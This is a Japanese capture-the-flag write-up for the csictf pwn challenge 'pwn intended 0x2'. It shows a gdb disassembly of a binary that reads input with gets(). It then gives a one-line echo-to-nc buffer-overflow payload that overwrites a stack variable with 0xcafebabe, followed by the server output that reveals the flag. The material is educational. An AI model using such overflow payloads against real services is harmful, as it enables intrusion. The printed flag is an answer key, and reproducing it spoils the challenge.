# pwn intended 0x2:Pwn:280pts
Travelling through spacetime!  
nc chall.csivit.com 30007  
[pwn-intended-0x2](pwn-intended-0x2)  

# Solution
pwn-intended-0x2が渡されるのでgdbで見てみる。  
```bash
$ gdb pwn-intended-0x2
~~~
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000401156 <+0>:     push   rbp
   0x0000000000401157 <+1>:     mov    rbp,rsp
   0x000000000040115a <+4>:     sub    rsp,0x30
   0x000000000040115e <+8>:     mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000401165 <+15>:    mov    rax,QWORD PTR [rip+0x2ef4]        # 0x404060 <stdout@@GLIBC_2.2.5>
   0x000000000040116c <+22>:    mov    esi,0x0
   0x0000000000401171 <+27>:    mov    rdi,rax
   0x0000000000401174 <+30>:    call   0x401040 <setbuf@plt>
   0x0000000000401179 <+35>:    mov    rax,QWORD PTR [rip+0x2ef0]        # 0x404070 <stdin@@GLIBC_2.2.5>
   0x0000000000401180 <+42>:    mov    esi,0x0
   0x0000000000401185 <+47>:    mov    rdi,rax
   0x0000000000401188 <+50>:    call   0x401040 <setbuf@plt>
   0x000000000040118d <+55>:    mov    rax,QWORD PTR [rip+0x2eec]        # 0x404080 <stderr@@GLIBC_2.2.5>
   0x0000000000401194 <+62>:    mov    esi,0x0
   0x0000000000401199 <+67>:    mov    rdi,rax
   0x000000000040119c <+70>:    call   0x401040 <setbuf@plt>
   0x00000000004011a1 <+75>:    lea    rdi,[rip+0xe60]        # 0x402008
   0x00000000004011a8 <+82>:    call   0x401030 <puts@plt>
   0x00000000004011ad <+87>:    lea    rax,[rbp-0x30]
   0x00000000004011b1 <+91>:    mov    rdi,rax
   0x00000000004011b4 <+94>:    mov    eax,0x0
   0x00000000004011b9 <+99>:    call   0x401060 <gets@plt>
   0x00000000004011be <+104>:   lea    rdi,[rip+0xe6c]        # 0x402031
   0x00000000004011c5 <+111>:   call   0x401030 <puts@plt>
   0x00000000004011ca <+116>:   cmp    DWORD PTR [rbp-0x4],0xcafebabe
   0x00000000004011d1 <+123>:   jne    0x4011f0 <main+154>
   0x00000000004011d3 <+125>:   lea    rdi,[rip+0xe66]        # 0x402040
   0x00000000004011da <+132>:   call   0x401030 <puts@plt>
   0x00000000004011df <+137>:   lea    rdi,[rip+0xe8a]        # 0x402070
   0x00000000004011e6 <+144>:   mov    eax,0x0
   0x00000000004011eb <+149>:   call   0x401050 <system@plt>
   0x00000000004011f0 <+154>:   mov    eax,0x0
   0x00000000004011f5 <+159>:   leave
   0x00000000004011f6 <+160>:   ret
End of assembler dump.
```
BOFがあることがわかる。  
`cmp    DWORD PTR [rbp-0x4],0xcafebabe`よりスタックを書き換えるだけで良いようだ。  
エンディアンに気をつけながら比較している場所をBOFで0xcafebabeに書き換える。  
```bash
$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca\x00\x00\x00\x00" | nc chall.csivit.com 30007
Welcome to csictf! Where are you headed?
Safe Journey!
You've reached your destination, here's a flag!
csictf{c4n_y0u_re4lly_telep0rt?}
```
flagが出てきた。  

## csictf{c4n_y0u_re4lly_telep0rt?}